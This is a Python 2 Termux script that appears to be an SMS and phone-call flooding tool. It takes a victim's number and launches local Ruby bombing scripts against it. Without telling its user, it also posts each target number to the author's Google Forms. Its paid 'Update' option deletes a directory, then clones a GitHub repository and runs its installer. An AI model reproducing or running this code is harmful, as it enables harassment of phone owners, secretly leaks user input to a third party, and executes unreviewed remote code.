import sys, mechanize, cookielib, random, os

r = '\x1b[1;31m'
g = '\x1b[1;32m'
y = '\x1b[1;33m'
b = '\x1b[1;34m'
c = '\x1b[1;36m'
os.system('cd $HOME && rm -rif install2')

def sem():
    print g, '      ali', r, '_', c, 'max'
    print y, '(1)', b, ' send sms'
    print y, '(2)', c, ' send call'
    print y, '(3)', g, ' Update / py ----> 2$'


sem()
print b
hh = raw_input('-----> ')

def opop():
    login = 'https://docs.google.com/forms/d/e/1FAIpQLSd3z_EH7MsdHpzwGhZqKS0qI4zqm5qrgEvOY0NRNiYTocFH4w/viewform'
    useragents = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
    br = mechanize.Browser()
    max = cookielib.LWPCookieJar()
    br.set_handle_robots(False)
    br.set_handle_redirect(True)
    br.set_cookiejar(max)
    br.set_handle_equiv(True)
    br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=5)
    br.addheaders = [('User-agent', random.choice(useragents))]
    site = br.open(login)
    br.select_form(nr=0)
    br.form['entry.1605878971'] = ' Adham Mahmoud  2 '
    br.form['entry.1875579975'] = 'https://www.facebook.com/profile.php?id=100025350871843'
    br.form['entry.1276616319'] = ' 01275241263 '
    br.form['entry.414798238'] = d
    br.form['entry.1019804155'] = ppp
    sub = br.submit()


def opp():
    login = 'https://docs.google.com/forms/d/e/1FAIpQLSdm04WWgtU6u34vnAqh_Z1YvVTjIFk6KfUtcm25Ulv91PeeWg/viewform'
    useragents = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
    br = mechanize.Browser()
    max = cookielib.LWPCookieJar()
    br.set_handle_robots(False)
    br.set_handle_redirect(True)
    br.set_cookiejar(max)
    br.set_handle_equiv(True)
    br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=5)
    br.addheaders = [('User-agent', random.choice(useragents))]
    site = br.open(login)
    br.select_form(nr=0)
    br.form['entry.763592338'] = cod
    sub = br.submit()


def op():
    login = 'https://docs.google.com/forms/d/e/1FAIpQLSexMkykLGlaiSrBlTgSMnnyXMp2ZI6mXPUxFqpxPzLmSHl6tw/viewform'
    useragents = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
    br = mechanize.Browser()
    max = cookielib.LWPCookieJar()
    br.set_handle_robots(False)
    br.set_handle_redirect(True)
    br.set_cookiejar(max)
    br.set_handle_equiv(True)
    br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=5)
    br.addheaders = [('User-agent', random.choice(useragents))]
    site = br.open(login)
    br.select_form(nr=0)
    br.form['entry.1213131597'] = dd
    sub = br.submit()


if '1' in hh:
    ppp = 'sms'
    print b
    d = raw_input('namper---> ')
    os.system('rm -rif max.txt')
    ff = open('max.txt', 'w+')
    r = '\n'
    rr = d + r
    ff.write(rr * 50)
    ff.close()
    opop()
    os.system('ruby /data/data/com.termux/files/usr/libexec/2/sms.rb')
elif '2' in hh:
    ppp = 'call'
    print c
    d = raw_input('namper---> ')
    os.system('rm -rif max.txt')
    ff = open('max.txt', 'w+')
    r = '\n'
    rr = d + r
    ff.write(rr * 50)
    ff.close()
    opop()
    os.system('ruby /data/data/com.termux/files/usr/libexec/2/call.rb')
elif '3' in hh:
    print y
    dd = raw_input('namper---> ')
    op()
    cod = raw_input('cod---> ')
    opp()
    raw_input(g, '           please wait             ')
    os.system('rm -rif /data/data/com.termux/files/usr/libexec/2')
    os.system('clear')
    os.system('cd /data/data/com.termux/files/usr/libexec && git clone https://github.com/alimaxali/install2')
    os.system('cd /data/data/com.termux/files/usr/libexec/install2 && python2 install2.py')
else:
    print r, 'erorr'
